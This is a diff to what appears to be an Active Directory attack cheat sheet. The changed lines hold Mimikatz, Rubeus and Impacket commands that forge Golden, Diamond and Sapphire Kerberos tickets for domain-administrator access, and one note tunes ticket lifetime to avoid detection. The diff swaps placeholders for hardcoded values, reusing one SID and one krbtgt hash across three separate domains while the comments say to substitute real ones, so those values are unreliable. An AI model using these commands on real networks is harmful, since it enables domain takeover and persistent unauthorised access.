@@ -219,11 +219,13 @@ secretsdump.py 'north.sevenkingdoms.local/Administrator:pass@192.168.56.10' \
 # 3. Get domain SID:
 Get-ADDomain | Select DomainSID
 
-# 4. Create Golden Ticket (valid for 10 years by default):
+# 4. Create Golden Ticket (valid for 10 years by default).
+#    Replace the SID below with the real domain SID from step 3, and KRBTGT_HASH with the
+#    value from step 2. Example SID shown for reference only.
 kerberos::golden /user:Administrator \
   /domain:north.sevenkingdoms.local \
-  /sid:S-1-5-21-... \
-  /krbtgt:KRBTGT_HASH \
+  /sid:S-1-5-21-1004336348-1177238915-682003330 \
+  /krbtgt:8846f7eaee8fb117ad06bdd830b7586c \
   /ptt
 
 # 5. Verify — access any DC resource:
@@ -275,8 +277,8 @@ Rubeus.exe asktgt /user:lowprivuser /password:Password1 /domain:corp.local /dc:d
 # Then replace the PAC in your TGT with the obtained PAC
 Rubeus.exe diamond /user:lowprivuser /password:Password1 /dc:dc01.corp.local /enctype:aes /krbkey:KRBTGT_AES256_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
-# Impacket ticketer with Sapphire Ticket approach
-ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... -domain corp.local -spn krbtgt/corp.local -user-id 500 Administrator
+# Impacket ticketer with Sapphire Ticket approach (substitute real krbtgt NTLM hash and domain SID)
+ticketer.py -nthash 8846f7eaee8fb117ad06bdd830b7586c -domain-sid S-1-5-21-1004336348-1177238915-682003330 -domain corp.local -spn krbtgt/corp.local -user-id 500 Administrator
 
 # Verify
 klist
@@ -525,7 +527,7 @@ Golden Ticket attacks are hard to prevent once the krbtgt hash is obtained. Key 
 ># Mimikatz Golden Ticket creation (with short lifetime to avoid detection):
 # /renewmax: max days ticket can be renewed
 # /endin: ticket expiry (in minutes)
-kerberos::golden /domain:eagle.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH \
+kerberos::golden /domain:eagle.local /sid:S-1-5-21-1004336348-1177238915-682003330 /rc4:8846f7eaee8fb117ad06bdd830b7586c \
   /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
 
 # Verify ticket in current session:
